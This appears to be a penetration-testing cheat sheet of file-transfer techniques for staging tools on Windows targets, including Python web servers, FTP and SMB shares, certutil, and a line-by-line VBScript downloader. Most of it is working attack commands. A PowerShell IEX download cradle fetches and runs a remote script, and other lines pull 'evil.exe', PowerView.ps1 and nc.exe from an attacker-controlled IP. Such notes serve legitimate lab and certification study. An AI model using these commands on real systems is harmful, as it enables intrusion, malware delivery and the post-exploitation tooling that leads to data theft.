- - -
### Doggy : 
Link : https://github.com/sc0tfree/updog   →  replacement for Python's `SimpleHTTPServer` 

**Serve from your current directory:** 
```sh
updog
```

**Serve from your current directory:**
```sh
updog -d /another/directory
```

**Serve from port you want:**
```sh
updog -p 1234
```
<br>

- - -
### ICMP-File-Transfer :  ( PYTHON2 )
[https://github.com/Vidimensional/Icmp-File-Transfer](https://github.com/Vidimensional/Icmp-File-Transfer)


```sh
icmp.py recv <destination file>

icmp.py send <file to transfer> <remote address>
```
<br>

- - -
### Python3 web-server : 

```sh
sudo pyhton3 -m http.server 80

Invoke-WebRequest  “http://<our_IP>/PowerView.ps1”  -OutFile “C:\temp\PowerView.ps1”
```
<br>

- - -
###  Python2 web-server : 

```sh
sudo python -m SimpleHTTPServer 80 

Invoke-WebRequest  “http://<our_IP>/PowerView.ps1”  -OutFile “C:\temp\PowerView.ps1”
```

- - -

### Downloading in windows : 

```powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')


powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')


certutil -urlcache -split -f "http://OUR_IP:80/file" [OUTPUT_FILE]

```
<br>

- - -
### FTP : 

```sh
pip install pyftpdlib
python -m pyftpdlib -p 21 -w
```

```powershell
echo open ip-addr > ftp.txt
echo USER ftp >> ftp.txt
echo password >> ftp.txt
echo binary >> ftp.txt
echo GET file.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```
<br>

- - -
### SMB :

```sh
python3 /usr/share/doc/python-impacket/examples/smbserver.py share_name dir_to_share
```

```powershell
net view \\OUR_IP
dir \\OUR_IP\share_name
copy \\OUR_IP\share_name\file output_file
```

**If You are Administrator** : 
run powershell as adminstrator.

```powershell
Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All

Y  <Press_Enter>
```
<br>

- - -

### VBScript : 

```powershell
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

After that run this command

```sh
cscript /nologo wget.vbs http://10.8.0.239/nc.exe nc.exe
```



